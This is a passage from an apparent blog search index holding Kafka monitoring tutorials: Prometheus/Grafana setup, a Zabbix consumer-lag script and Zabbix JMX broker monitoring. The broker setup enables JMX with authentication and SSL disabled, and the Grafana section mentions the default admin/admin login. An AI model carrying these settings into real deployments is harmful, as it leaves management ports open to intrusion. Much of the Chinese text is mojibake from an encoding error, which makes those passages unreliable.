positionï¼Œè¡¨ç¤ºè¯¥æ¡Messageåœ¨æ•°æ®æ–‡ä»¶ä¸­çš„ç»å¯¹ä½ç½®ã€‚åªè¦æ‰“å¼€æ–‡ä»¶å¹¶ç§»åŠ¨æ–‡ä»¶æŒ‡é’ˆåˆ°è¿™ä¸ªpositionå°±å¯ä»¥è¯»å–å¯¹åº”çš„Messageäº†ã€‚indexæ–‡ä»¶ä¸­å¹¶æ²¡æœ‰ä¸ºæ•°æ®æ–‡ä»¶ä¸­çš„æ¯æ¡Messageå»ºç«‹ç´¢å¼•ï¼Œè€Œæ˜¯é‡‡ç”¨äº†ç¨€ç–å­˜å‚¨çš„æ–¹å¼ï¼Œæ¯éš”ä¸€å®šå­—èŠ‚çš„æ•°æ®å»ºç«‹ä¸€æ¡ç´¢å¼•ã€‚è¿™æ ·é¿å…äº†ç´¢å¼•æ–‡ä»¶å ç”¨è¿‡å¤šçš„ç©ºé—´ï¼Œä»è€Œå¯ä»¥å°†ç´¢å¼•æ–‡ä»¶ä¿ç•™åœ¨å†…å­˜ä¸­ã€‚ä½†ç¼ºç‚¹æ˜¯æ²¡æœ‰å»ºç«‹ç´¢å¼•çš„Messageä¹Ÿä¸èƒ½ä¸€æ¬¡å®šä½åˆ°å…¶åœ¨æ•°æ®æ–‡ä»¶çš„ä½ç½®ï¼Œä»è€Œéœ€è¦åšä¸€æ¬¡é¡ºåºæ‰«æï¼Œä½†æ˜¯è¿™æ¬¡é¡ºåºæ‰«æçš„èŒƒå›´å°±å¾ˆå°äº†ã€‚ äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2017/03/30/Bigdata-hadoop/Kafka/Kafkaæ—¥å¿—å­˜å‚¨è§£æä¸å®è·µæ•°æ®å­˜å‚¨ä¼˜åŒ–/"},{"title":"Monitor Kafka with Prometheus +Grafana","text":"Monitoring Kafka with PrometheusWeâ€™ve previously looked at how to monitor Cassandra with Prometheus. Letâ€™s see the process for getting metrics from another popular Java application, Kafka. we download Kafka, the JMX exporter and the config file: 12345678910111213141516171819wget http://ftp.heanet.ie/mirrors/www.apache.org/dist/kafka/0.10.1.0/kafka_2.11-0.10.1.0.tgztar -xzf kafka _ *ã€‚tgzcd kafka_ *wget https://repo1.maven.org/maven2/io/prometheus/jmx/jmx_prometheus_javaagent/0.6/jmx_prometheus_javaagent-0.6.jarwget https://raw.githubusercontent.com/prometheus/jmx_exporter/master/example_configs/kafka-0-8-2.ymlDownload the good files and put them under the Kafka directory:[hadoop@hadoop6 kafka_2.10-0.9.0.1]$ lldrwxr-xr-x 3 hadoop hadoop 4096 9æœˆ 27 13:34 bindrwxr-xr-x 2 hadoop hadoop 4096 9æœˆ 27 21:18 config-rw-rw-r-- 1 hadoop hadoop 1225418 2æœˆ 5 2016 jmx_prometheus_javaagent-0.6.jar-rw-rw-r-- 1 hadoop hadoop 2824 9æœˆ 26 17:48 kafka-0-8-2.ymldrwxr-xr-x 2 hadoop hadoop 4096 9æœˆ 27 13:31 libs-rw-r--r-- 1 hadoop hadoop 11358 2æœˆ 12 2016 LICENSEdrwxrwxr-x 2 hadoop hadoop 266240 9æœˆ 27 21:19 logs-rw-r--r-- 1 hadoop hadoop 162 2æœˆ 12 2016 NOTICEdrwxrwxr-x 5 hadoop hadoop 4096 9æœˆ 27 15:56 prometheus-1.2.1.linux-amd64drwxr-xr-x 2 hadoop hadoop 4096 2æœˆ 12 2016 site-docs We start a Zookeeper (a Kafka dependency) and Kafka with the JMX exporter running as a Java agent: 1234567891011121314151617181920First step:Configure the zookeeper zoo.zoo.cfg port: 2181Start zookeeper:./zookeeper-3.4.6/bin/zkServer.sh startSecond steps:Configuration modification: kafka_2.10-0.9.0.1/config/zookeeper.propertiesPort modification: 2182 do not conflict with the zookeeper service portdataDir=/data2/zookeeper-3.4.6/zookeeper-data# the port at which the clients will connectclientPort=2181# disable the per-ip limit on the number of connections since this is a non-production configmaxClientCnxns=0./bin/zookeeper-server-start.sh config/zookeeper.properties &amp;KAFKA_OPTS=\"$KAFKA_OPTS -javaagent:$PWD/jmx_prometheus_javaagent-0.6.jar=7071:$PWD/kafka-0-8-2.yml\" \\./bin/kafka-server-start.sh config/server.properties &amp; If you visit http://localhost:7071/metrics youâ€™ll see the metrics.Letâ€™s setup a quick Prometheus server: 1234567891011121314wget https://github.com/prometheus/prometheus/releases/download/v1.2.1/prometheus-1.2.1.linux-amd64.tar.gztar -xzf prometheus-*.tar.gzcd prometheus-*cat &lt;&lt;'EOF' &gt; prometheus.ymlglobal: scrape_interval: 10s evaluation_interval: 10sscrape_configs: - job_name: 'kafka' static_configs: - targets: - localhost:7071EOF./prometheus Following run access: http://localhost:9090/graph 123456789[hadoop@hadoop8 prometheus-1.2.1.linux-amd64]$ ./prometheusINFO[0000] Starting prometheus (version=1.2.1, branch=master, revision=dd66f2e94b2b662804b9aa1b6a50587b990ba8b7) source=main.go:75INFO[0000] Build context (go=go1.7.1, user=root@fd9b0daff6bd, date=20161010-15:58:23) source=main.go:76INFO[0000] Loading configuration file prometheus.yml source=main.go:247INFO[0000] Loading series map and head chunks... source=storage.go:354INFO[0000] 49 series loaded. source=storage.go:359WARN[0000] No AlertManagers configured, not dispatching any alerts source=notifier.go:176INFO[0000] Listening on :9090 source=web.go:240INFO[0000] Starting target manager... source=targetmanager.go:76 The Prometheus platform monitors all data from the Kafka index:This function is very powerful, late will explain what each representative means: Install open source Grafana monitoring, combine prometheus.io to obtain Prometheus platform data. Installing Grafana1234567# Download and unpack Grafana from binary tar (adjust version as appropriate).curl -L -O https://grafanarel.s3.amazonaws.com/builds/grafana-2.5.0.linux-x64.tar.gztar zxf grafana-2.5.0.linux-x64.tar.gz# Start Grafana.cd grafana-2.5.0/./bin/grafana-server web UsingBy default, Grafana will be listening on http://localhost:3000. The default login is â€œadminâ€ / â€œadminâ€. Creating a Prometheus data sourceTo create a Prometheus data source: Click on the Grafana logo to open the sidebar menu. Click on â€œData Sourcesâ€ in the sidebar. Click on â€œAdd Newâ€. Select â€œPrometheusâ€ as the type. Set the appropriate Prometheus server URL (for example, http://localhost:9090/) Adjust other data source settings as desired (for example, turning the proxy access off). Click â€œAddâ€ to save the new data source. The following shows an example data source configuration: Reference address: GRAFANA SUPPORT FOR PROMETHEUS Finally load the Kafka Overview dashboard from grafana.net into your Grafana to get the above console! If you want to run Kafka inside docker, thereâ€™s another blog post covering that. Reference address: monitoring-kafka-with-prometheus Communicative learning:ğŸ§ Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)ğŸ§ BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2017/08/04/Bigdata-hadoop/Kafka/Monitor Kafka with Prometheus +Grafana/"},{"title":"Zabbix-Monitoring Kafkaé›†ç¾¤ Consumer | kafkaçš„ç›‘æ§å’Œå‘Šè­¦","text":"Zabbix-Monitoring Kafkaé›†ç¾¤ Consumer | kafkaçš„ç›‘æ§å’Œå‘Šè­¦å‰é¢ä¸€ç¯‡è®²äº†æˆ‘ä»¬ç›‘æ§kafkaé›†ç¾¤BrokersæœåŠ¡çŠ¶æ€ç›‘æ§ã€‚ç”Ÿäº§ç¯å¢ƒç›‘æ§ï¼Œå¯ä»¥åœ¨Zabbixä¸­å¯¹Kafkaè¿›è¡Œç›‘æ§ï¼Œä¸€ç§æ˜¯ç›‘æ§JMXç«¯å£ï¼Œå¦å¤–ä¸€ç§æ˜¯ç›´æ¥å†™è„šæœ¬ï¼Œä½¿ç”¨bin/kafka-run-class.shé‡Œæä¾›çš„ç›¸å…³æ–¹æ³•ç±»ã€‚ æ ¹æ®æˆ‘ä»¬çš„ä¸šåŠ¡åœºæ™¯ï¼Œæœ€ä¸ºä¸»è¦çš„çš„æ˜¯ç›‘æ§æ¶ˆè´¹è€…Lagçš„æƒ…å†µã€‚æ‰€æœ‰æˆ‘ç›´æ¥å†™è„šæœ¬äº†ã€‚æˆ‘ä»¬å¯¹æŸä¸€ä¸ªTopicçš„30ä¸ªåˆ†åŒºï¼Œæ¯ä¸ªåˆ†åŒºï¼Œå½“å‰Consumerçš„Lagæƒ…å†µã€‚å½“ç„¶è¿˜å¯ä»¥ç”Ÿæˆæ±‡æ€»å›¾ï¼Œåœ¨æ­¤ä¸åšå¤šå±•ç¤ºã€‚åœ¨Zabbixä¸­é…ç½®å¯¹åº”çš„Triggersï¼Œå½“Lagè¶…è¿‡é˜€å€¼ï¼Œå®ç°æŠ¥è­¦ã€‚ è¿™é‡Œæˆ‘ç”¨å‘½ä»¤åœ¨kafkaå½“ä¸­ä¸€å°æœåŠ¡å™¨è·å–äº†å…¶ä¸­ä¸€ä¸ªTopic groupçš„Lagã€‚ 1234567891011121314151617[jollybi@countly2 kafka_2.10]$ bin/kafka-run-class.sh kafka.tools.ConsumerOffsetChecker --zookeeper 75.126.39.4:2281,75.126.5.2:2281,75.126.5.1:2281 --group group_zybi --topic mongotail_lz4 æ¶ˆè´¹ç»„ è¯é¢˜id åˆ†åŒºID å½“å‰å·²æ¶ˆè´¹çš„æ¡æ•° æ€»æ¡æ•° æœªæ¶ˆè´¹çš„ Group Topic Pid Offset logSize Lag Ownergroup_zybi mongotail_lz4 0 1092163900 2253744158 1161580258 nonegroup_zybi mongotail_lz4 1 1092281117 2253795899 1161514782 nonegroup_zybi mongotail_lz4 2 1092834883 2253771036 1160936153 nonegroup_zybi mongotail_lz4 3 1092822121 2253772916 1160950795 nonegroup_zybi mongotail_lz4 4 1092040532 2253775432 1161734900 nonegroup_zybi mongotail_lz4 5 1095163824 2253744329 1158580505 nonegroup_zybi mongotail_lz4 6 1097623779 2253781500 1156157721 nonegroup_zybi mongotail_lz4 7 1097459357 2253782032 1156322675 nonegroup_zybi mongotail_lz4 8 1099080546 2253741287 1154660741 nonegroup_zybi mongotail_lz4 9 1099028190 2253785053 1154756863 nonegroup_zybi mongotail_lz4 10 1099535928 2253795680 1154259752 nonegroup_zybi mongotail_lz4 11 1099701993 2253742880 1154040887 none å…¶å®å‘½ä»¤å¤§ä½“çš„é€»è¾‘å°±æ˜¯é€šè¿‡Consumerè·å–åˆ°å½“å‰çš„offsetï¼Œå°±èƒ½æœ‰lagä¿¡æ¯äº†ï¼Œå¦‚ä½•å†™æˆè„šæœ¬è·å–æˆ‘ä»¬æƒ³è¦çš„æ¶ˆè´¹å’Œæœªæ¶ˆè´¹ä¸æ€»æ¶ˆæ¯æ¡æ•°å‘¢ã€‚ è„šæœ¬è´´å‡ºæ¥äº†ï¼Œå¾ˆç®€å•ç†è§£ï¼ŒæŠŠè‡ªå·±è·å–åˆ°topicçš„æ¶ˆè´¹æ¡æ•°è¿‡æ»¤ã€‚æˆ‘å…¬å¸æœ‰ä¸¤ä¸ªä¸»é¢˜topicåˆ†åˆ«å¯¹ä¸åŒç»„è·å–lag. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748[root@countly2 zabbix]# vim monitor_kafka.sh#!/bin/bashexport JAVA_HOME=/home/jollybi/tools/java-7-sunexport CLASSPATH=$CLASSPATH:.:$JAVA_HOME/lib:$JAVA_HOME/jre/libexport PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$PATHtopic=mongotail_lz4_impgroup=group_imp#topic2topic2=mongotail_lz4group2=group_eventgroup3=group_event_spm#å¯åŠ¨ç›®å½•kafkaserver=/home/jollybi/tools/kafka_2.10-0.8.2.1/bin/kafka-run-class.shzk=75.126.39.4:2281,75.126.5.2:2281,75.126.5.8:2281function imp_lag &#123;echo \"`$kafkaserver kafka.tools.ConsumerOffsetChecker --zookeeper $zk --group $group --topic $topic | sed -n 2p | awk '&#123;print $6&#125;'`\"&#125;function imp_logsize &#123;echo \"`$kafkaserver kafka.tools.ConsumerOffsetChecker --zookeeper $zk --group $group --topic $topic | sed -n 2p | awk '&#123;print $5&#125;'`\"&#125;function imp_offset &#123;echo \"`$kafkaserver kafka.tools.ConsumerOffsetChecker --zookeeper $zk --group $group --topic $topic | sed -n 2p | awk '&#123;print $4&#125;'`\"&#125;function event_spm_lag &#123;echo \"`$kafkaserver kafka.tools.ConsumerOffsetChecker --zookeeper $zk --group $group2 --topic $topic2 | sed -n 2p | awk '&#123;print $6&#125;'`\"&#125;function event_spm_logsize &#123;echo \"`$kafkaserver kafka.tools.ConsumerOffsetChecker --zookeeper $zk --group $group2 --topic $topic2 | sed -n 2p | awk '&#123;print $5&#125;'`\"&#125;function event_spm_offset &#123;echo \"`$kafkaserver kafka.tools.ConsumerOffsetChecker --zookeeper $zk --group $group2 --topic $topic2 | sed -n 2p | awk '&#123;print $4&#125;'`\"&#125;function event_lag &#123;echo \"`$kafkaserver kafka.tools.ConsumerOffsetChecker --zookeeper $zk --group $group3 --topic $topic2 | sed -n 2p | awk '&#123;print $6&#125;'`\"&#125;function event_logsize &#123;echo \"`$kafkaserver kafka.tools.ConsumerOffsetChecker --zookeeper $zk --group $group3 --topic $topic2 | sed -n 2p | awk '&#123;print $5&#125;'`\"&#125;function event_offset &#123;echo \"`$kafkaserver kafka.tools.ConsumerOffsetChecker --zookeeper $zk --group $group3 --topic $topic2 | sed -n 2p | awk '&#123;print $4&#125;'`\"&#125;# Run the requested function$1 â° è¿™é‡Œè„šæœ¬æˆ‘æ›´æ–°è¿‡äº†ï¼Œè¿™ä¸ªè„šæœ¬å®ç°æ˜¯å½“ä¸ªåˆ†ç‰‡çš„æ¶ˆè´¹æƒ…å†µã€‚ ä¸æ˜¯æ€»çš„æ¶ˆè´¹å’Œæœªæ¶ˆè´¹çš„å–åˆ°çš„å€¼ã€‚ğŸ‹ éœ€è¦åŸè„šæœ¬çš„ç•™è¨€å–”ï¼Œä¸‹é¢æ­¥éª¤éƒ½æ˜¯ä¸€æ ·çš„æ•ˆæœã€‚ è„šæœ¬æ”¾åˆ°kafkaæœåŠ¡å™¨/etc/zabbix/ä¸‹é¢ï¼Œå¹¶é…åˆzabbixç›‘æ§ã€‚12345[root@countly2 zabbix]# lltotal 8-rwxrwxr-x 1 jollybi jollybi 1932 Jun 7 10:40 monitor_kafka.sh-rw-r--r-- 1 root root 218 Jun 7 14:19 zabbix_agentd.confdrwxr-xr-x 2 root root 45 Sep 20 2016 zabbix_agentd.d ç„¶åzabbix_agentd.confæ‰©å±•é…ç½®1UserParameter=kafka.[*],/etc/zabbix/monitor_kafka.sh $1 ä¹Ÿå¯ä»¥è¿™ä¹ˆå†™ï¼š 123456789UserParameter=kafka.imp_lag,/etc/zabbix/monitor_kafka.sh imp_lagUserParameter=kafka.imp_offset,/etc/zabbix/monitor_kafka.sh imp_offsetUserParameter=kafka.imp_logsize,/etc/zabbix/monitor_kafka.sh imp_logsizeUserParameter=kafka.event_spm_lag,/etc/zabbix/monitor_kafka.sh event_spm_lagUserParameter=kafka.event_spm_logsize,/etc/zabbix/monitor_kafka.sh event_spm_logsizeUserParameter=kafka.event_spm_offset,/etc/zabbix/monitor_kafka.sh event_spm_offset UserParameter=kafka.event_lag,/etc/zabbix/monitor_kafka.sh event_lagUserParameter=kafka.event_offset,/etc/zabbix/monitor_kafka.sh event_offsetUserParameter=kafka.event_logsize,/etc/zabbix/monitor_kafka.sh event_logsize è¿™é‡Œå†™é”®å€¼å°±ä¸éœ€è¦åŠ [] ç„¶åé…ç½®å®Œæˆé‡å¯zabbix-agentæœåŠ¡ã€‚ zabbixè®¾ç½®Keyzabbix-ç»„æ€-æ¨¡æ¿-åˆ›å»ºæ¨¡æ¿ã€‚ åˆ›å»ºï¼šKafkaConsumersæ¨¡æ¿ç„¶åç‚¹å‡»KafkaConsumersæ¨¡æ¿ï¼Œåˆ›å»ºç›¸åº”çš„é¡¹ç›®:kafka.event_lag æœªæ¶ˆè´¹çš„æ¡æ•° è®¾ç½®zabbixä»£ç†ã€‚é»˜è®¤çš„ä»£ç†æ–¹å¼ã€‚ zabbix,key é”®å€¼ 1kafka.[event_lag] æ•°æ®ç±»å‹é»˜è®¤æµ®ç‚¹å°±å¯ä»¥äº†ã€‚ åé¢åº”ç”¨é›†é€‰æ‹©ä¸‹KafkaConsumers å³å¯ã€‚ é™†é™†ç»­ç»­é…ç½®å®Œæ‰€æœ‰é¡¹ç›®ã€‚ ç„¶åé…ç½®å›¾å½¢ã€‚ æŸ¥çœ‹æœ€æ–°æ•°æ®å›¾ï¼š å‡ºç°é—®é¢˜ç¬¬ä¸€æ—¶é—´å‘é€æŠ¥è­¦æ¶ˆæ¯ã€‚æŠ¥è­¦çš„Triggerè§¦å‘è§„åˆ™ä¹Ÿæ˜¯å¯¹lagçš„å€¼åšæŠ¥è­¦ï¼Œå…·ä½“é˜€å€¼è®¾ç½®ä¸ºå¤šå°‘ï¼Œè¿˜æ˜¯çœ‹å¤§å®¶å„è‡ªä¸šåŠ¡éœ€æ±‚äº†ã€‚ è¿™é‡Œæˆ‘å¯¹æœªæ¶ˆè´¹å‘Šè­¦å®šæ—¶60åˆ†é’Ÿè§¦å‘ä¸€æ¬¡ã€‚âš ï¸æ³¨é‡Šï¼šè®¾ç½®group_event_lagæœ€è¿‘æ¶ˆæ¯æ¡æ•°çš„60åˆ†é’Ÿæ—¶é—´ä¹‹å†…ä¸€ç›´è¶…è¿‡200ä¸‡æ¶ˆè´¹åˆ™æŠ¥è­¦ äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2017/06/05/Bigdata-hadoop/Kafka/Zabbix-Monitoring Kafka Consumer | kafkaçš„ç›‘æ§å’Œå‘Šè­¦/"},{"title":"Zabbixç›‘æ§Kafkaé›†ç¾¤ BrokersæœåŠ¡","text":"Zabbixç›‘æ§Kafkaé›†ç¾¤ BrokersæœåŠ¡ å‰è¨€ï¼šMonitoring Kafka with Datadog This post is the final part of a 3-part series on how to monitor Kafka. Part 1 explores the key metrics available from Kafka, and Part 2 is about collecting those metrics on an ad hoc basis. To implement ongoing, meaningful monitoring, you will need a dedicated system that allows you to store, visualize, and correlate your Kafka metrics with the rest of your infrastructure. Kafka deployments often rely on additional software packages not included in the Kafka codebase itself, in particular Apache ZooKeeper. A comprehensive monitoring implementation includes all the layers of your deployment, including host-level metrics when appropriate, and not just the metrics emitted by Kafka itself. æˆ‘åœ¨å¤„ç†HadoopåŠç›¸å…³æœåŠ¡ç›‘æ§ã€æŠ¥è­¦è¿™é‡Œä¸»è¦è®²kafkaé›†ç¾¤æœåŠ¡ã€‚è¿™é‡Œæˆ‘ä¹Ÿçœ‹äº†å‡ ç¯‡kafkaç›¸å…³æ–‡ç« ï¼Œå¥½æ–‡è´´å‡ºæ¥ï¼š infoq kafka å…¥é—¨äº†è§£ kafka å·¥ä½œåŸç†ä»‹ç» åœ¨æˆ‘ä»¬å…¬å¸ä¸»è¦Kafka çš„å‡ ä¸ªç‰¹æ€§éå¸¸æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ï¼šå¯æ‰©å±•æ€§ã€æ•°æ®åˆ†åŒºã€ä½å»¶è¿Ÿã€å¤„ç†å¤§é‡ä¸åŒæ¶ˆè´¹è€…çš„èƒ½åŠ›ã€‚ è€Œè¿™é‡Œæˆ‘æƒ³å¸®å¿™BIå›¢é˜Ÿå®ç°Kafkaå…¨é¢ç›‘æ§ã€‚åˆ†ä¸¤ç‚¹ï¼š 121. ç›‘æ§Kafka BrokersæœåŠ¡2. ç›‘æ§Kafka Lagå †ç§¯æ•° å¯¹äºKafkaçš„ç›‘æ§ï¼Œå·²ç»æœ‰ç°æˆçš„å¼€æºè½¯ä»¶äº†ï¼Œåœ¨æˆ‘ä»¬å…¬å¸å†…éƒ¨ä¹Ÿä½¿ç”¨äº†ä¸€æ®µæ—¶é—´ï¼Œæœ‰ä¸¤ç§æ–¹æ¡ˆã€‚æˆ‘ä»¬å…¬å¸ç”¨ç¬¬ä¸‰ç§æ–¹æ¡ˆã€‚ä¸€èˆ¬éƒ½ä¼šé€‰æ‹©ä¸¤ä¸ªå¼€æºçš„å·¥å…·ï¼šKafkaOffsetMonitorå’Œkafka-web-consoleï¼Œè¿™ä¸¤æ¬¾æˆ‘éƒ½æœ‰ç”¨è¿‡. Kafkaä¸‰æ¬¾ç›‘æ§å·¥å…·æ¯”è¾ƒ ç›®å½• 1231ã€Kafka Web Conslole2ã€Kafka Manager3ã€KafkaOffsetMonitor KafkaOffsetMonitorï¼šæœ€å¤§çš„å¥½å¤„å°±æ˜¯é…ç½®ç®€å•ï¼Œåªéœ€è¦é…ä¸ªzookeeperçš„åœ°å€å°±èƒ½ç”¨äº†ï¼Œå‘çˆ¹çš„åœ°æ–¹å°±æ˜¯ä¸èƒ½è‡ªåŠ¨åˆ·æ–°ï¼Œæ‰‹åŠ¨åˆ·æ–°æ—¶è€—æ—¶è¾ƒé•¿ï¼Œè€Œä¸”æœ‰æ—¶å€™éƒ½åˆ·ä¸å‡ºæ¥ï¼Œå¦å¤–å°±æ˜¯å›¾åƒç”¨äº†ä¸€æ®µæ—¶é—´å°±å®Œå…¨æ˜¾ç¤ºä¸äº†äº†ï¼Œä¸çŸ¥é“å¤§å®¶æ˜¯ä¸æ˜¯è¿™æ ·ã€‚ kafka-web-consoleï¼šç›¸æ¯”ä¸å‰è€…ï¼Œæ•°æ®æ˜¯è½åœ°çš„ï¼Œå› æ­¤åˆ·æ–°è¾ƒå¿«ï¼Œè€Œä¸”æ”¯æŒåœ¨å‰ç«¯è‡ªå®šä¹‰zookeeperçš„åœ°å€ï¼Œè¿˜èƒ½åˆ—å‡ºå®æ—¶çš„topicé‡Œçš„å…·ä½“å†…å®¹ã€‚ä½†æ˜¯æ­å»ºæ¯”è¾ƒå¤æ‚ï¼Œè€Œä¸”githubä¸Šçš„é»˜è®¤æ•°æ®åº“æ˜¯H2çš„ï¼Œåƒæˆ‘ä»¬ä¸€èˆ¬ç”¨mysqlçš„ï¼Œè¿˜å¾—è‡ªå·±è½¬åŒ–ã€‚å¦å¤–åœ¨ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨è¿æ¥kafkaçš„leaderå¤±è´¥çš„æ—¶å€™ï¼Œä¼šä¸€ç›´é‡è¯•ï¼Œå…¶ç»“æœå°±æ˜¯å¯¼è‡´æˆ‘kafkaçš„é‚£å°æœºå­è¿æ¥æ•°è¿‡é«˜ï¼Œéƒ½åˆ°2wäº†ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯å®ƒçš„ä¸€ä¸ªbugã€‚ å…·ä½“ä»‹ç»ä»¥åŠå®‰è£…åœ¨æˆ‘å¦å¤–ç¯‡åšæ–‡ã€‚è¿™é‡Œä¸è¯¦ç»†è®²è§£å¼€æºè½¯ä»¶ï¼Œè¿™é‡Œç”¨zabbixç›‘æ§Kafka BrokersæœåŠ¡ã€‚ kafka-monitoring BrokersæœåŠ¡æ“ä½œç³»ç»Ÿç¯å¢ƒï¼š 123Centos 7.1 64Gå†…å­˜2Tç£ç›˜ç©ºé—´ï¼ŒæŒ‡å®škafkaå†™å…¥æ•°æ®ç›®å½•ã€‚ è¯´æ˜ä¸‹: ç›‘æ§Brokersæ˜¯åˆ©ç”¨Zabbix JMXç›‘æ§è·å–æ•°æ®ã€‚ â˜ï¸ç¬¬ä¸€æ­¥ï¼šä¸ç”¨è§£é‡Šå‰æä½ åœ¨zabbix-serverç«¯å·²ç»å®‰è£…è¿‡abbix-java-gataway å¦‚æœæ²¡æœ‰å®‰è£…å¯ä»¥çœ‹ä¸‹é¢ï¼Œå®‰è£…è¿‡å¯ä»¥ç•¥è¿‡ç¬¬ä¸€æ­¥ã€‚ 1.0 å®‰è£…é…ç½®zabbix-java-gataway 1234567891011yum install -y zabbix-java-gatawayvi /etc/zabbix/zabbix_java_gateway.confSTART_POLLERS=10 Uncomentå¹¶è®¾ç½®ä¸ºStartJavaPollers = 5 æ›´æ”¹JavaGatewayçš„ IP = IP_address_java_gateway``` 1.1 é‡æ–°å¯åŠ¨zabbix-server```bash/etc/init.d/zabbix-java-gataway restartchkconfig --level 345 zabbix-java-gataway on/etc/init.d/zabbix-java-gataway start â˜ï¸ç¬¬äºŒæ­¥ï¼šKafkaé…ç½® è¿™é‡Œæˆ‘ä»¬æœåŠ¡å™¨ç»™å¤§æ•°æ®é‚£è¾¹å®‰è£…åœ¨æŒ‡å®šç”¨æˆ·ç›®å½•ä¸‹é¢ï¼š/home/jollybi/tools/kafka_2.10-0.8.2.1 123456789101112131415su - jollybi è¿›å…¥ç›¸åº”ç”¨æˆ·vim /home/jollybi/tools/kafka_2.10-0.8.2.1/kafka-run-class.shä»# JMX settingsif [ -z \"$KAFKA_JMX_OPTS\" ]; thenKAFKA_JMX_OPTS=\"-Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.authenticate=false - Dcom.sun.management.jmxremote.ssl=false \"fiè‡³# JMX settingsif [ -z \"$KAFKA_JMX_OPTS\" ]; thenKAFKA_JMX_OPTS=\"-Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.port=12345 - Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false \"fi é‡å¯æœåŠ¡ï¼š 12/home/jollybi/tools/kafka_2.10-0.8.2.1/bin/kafka-server-stop.sh/home/jollybi/tools/kafka_2.10-0.8.2.1/bin/kafka-server-start.sh â˜ï¸ç¬¬ä¸‰æ­¥ï¼šå¯¼å…¥æ¨¡æ¿ç™»å½•åˆ°æ‚¨çš„zabbixç½‘é¡µ. å¯¼å…¥æ¨¡æ¿ç™»å½•åˆ°æ‚¨çš„zabbixç½‘é¡µ å•å‡»é…ç½® - &gt;æ¨¡æ¿ - &gt;å¯¼å…¥ ä¸‹è½½æ¨¡æ¿ zbx_kafka_templates.xml å¹¶ä¸Šä¼ åˆ°zabbixç„¶åå°†æ­¤æ¨¡æ¿æ·»åŠ åˆ°Kafkaå¹¶åœ¨zabbixä¸Šé…ç½®JMXæ¥å£ è¾“å…¥Kafka IPåœ°å€å’ŒJMXç«¯å£å¦‚æœçœ‹åˆ°jmxå›¾æ ‡ï¼Œæ‚¨é…ç½®äº†JMXç›‘æ§å¥½ï¼ æŸ¥çœ‹æ•°æ®ï¼š æŸ¥çœ‹æ•ˆæœå›¾ï¼š å‚è€ƒå®˜ç½‘ç›‘æ§æŒ‡æ ‡çš„å«ä¹‰; Servilo Metrics broker MetricsProducer Metrics Global Request MetricsGlobal Connection Metrics äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2017/06/01/Bigdata-hadoop/Kafka/Zabbixç›‘æ§Kafkaé›†ç¾¤ BrokersæœåŠ¡/"},{"title":"kafkaæ€»æ˜¯åœ¨å¯åŠ¨ä¸€æ®µæ—¶é—´åè‡ªåŠ¨åœæ­¢","text":"kafkaæ€»æ˜¯åœ¨å¯åŠ¨ä¸€æ®µæ—¶é—´åè‡ªåŠ¨åœæ­¢123456789101112131415161718192021222324252627282930313233343536373839404142[2018-04-01 11:24:08,269] INFO [ReplicaFetcherManager on broker 2] Removed fetcher for partitions [namespace_jolly_brands_zy702_who_wms_order_user_info,2] (kafka.server.ReplicaFetcherManager)[2018-04-01 11:24:08,269] INFO Truncating log namespace_jolly_brands_zy702_who_wms_order_user_info-2 to offset 69346. (kafka.log.Log)[2018-04-01 11:24:08,292] INFO 